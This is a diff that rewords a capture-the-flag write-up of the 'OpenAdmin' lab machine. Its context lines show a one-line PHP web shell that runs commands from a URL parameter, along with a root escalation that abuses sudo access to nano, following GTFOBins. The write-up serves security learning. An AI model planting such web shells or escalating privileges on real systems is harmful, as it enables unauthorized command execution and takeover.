@@ -315,7 +315,7 @@ drwxr-xr-x 4 root  root     4096 Nov 22 18:15 ..
 -rwxrwxr-x 1 jimmy internal  185 Nov 23 16:37 logout.php
 -rwxrwxr-x 1 jimmy internal  339 Nov 23 17:40 main.php
 ```
-I have read and write permissions in the dir `internal` so I can create `php` file that may execute my commands as in `cmd=param`
+We have read and write permissions in the dir `internal` so I can create `php` file that may execute my commands as in `cmd=param`
 ```
 <?php echo "<pre>"; system($_GET['cmd']); ?>
 ```
@@ -439,11 +439,11 @@ User joanna may run the following commands on openadmin:
 
 We can edit the file on `/opt/priv` using nano as **root**.
 
-I tried to search for `nano` on [GTFOBINS](https://gtfobins.github.io/gtfobins/nano/)
+Search for `nano` on [GTFOBINS](https://gtfobins.github.io/gtfobins/nano/)
 
 Open the file on `/opt/priv` in **nano** as **root** with `sudo`, and press `ctrl+r and then ctrl+x` to run commands.
 
-I found multiple ways to get root, but I used `cat` to print **root.txt**
+Found multiple ways to get root, but I used `cat` to print **root.txt**
  
 ```
 joanna@openadmin:~$ sudo nano /opt/priv
